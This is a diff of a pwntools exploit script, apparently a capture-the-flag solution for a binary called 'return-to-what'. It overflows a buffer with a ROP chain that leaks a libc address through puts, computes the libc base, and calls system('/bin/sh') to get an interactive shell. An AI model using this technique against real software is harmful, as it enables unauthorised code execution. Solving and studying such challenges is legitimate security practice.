@@ -3,40 +3,33 @@
 from pwn import *
 
 context.clear(arch='amd64')
-elf = ELF('./return-to-what')
+
+elf = ELF('./return-to-what_patched')
+libc = ELF('./libc.so.6')
 
 
-rop = ROP(elf)
-
-rop.raw(rop.rdi.address)
-rop.raw(elf.got.puts)
-rop.raw(elf.plt.puts) 
-
-rop.raw(elf.sym['main'])
-
-r = process('./return-to-what')
-r.clean()
-r.writeline(b'A'*56 + rop.chain())
-
-leak = r.readline()[:-1]
-leak = unpack(leak, len(leak) * 8)
-libc = leak - 0x765f0
-
+r = process('./return-to-what_patched')
 
 rop = ROP(elf)
-
-rop.raw(rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']).address)
-rop.raw(0) # pop r12
-rop.raw(0) # pop r13
-rop.raw(0) # pop r14
-rop.raw(0) # pop r15
-
-rop.raw(libc + 0xcbd1a)
+rop.puts(elf.got.puts)
+rop.raw(elf.sym.main)
+log.info(rop.dump())
 
 r.clean()
 r.writeline(b'A'*56 + rop.chain())
 
+leak = unpack(r.readline()[:-1], 'all')
+libc.address = leak - 0x84450
+log.info(f'leak = {hex(leak)}')
+log.info(f'libc = {hex(libc.address)}')
 
+
+rop = ROP(libc)
+rop.raw(rop.find_gadget(['ret']).address)
+rop.system(next(libc.search(b'/bin/sh')))
+log.info(rop.dump())
+
+r.writeline(b'A'*56 + rop.chain())
 r.clean()
 r.interactive()
 
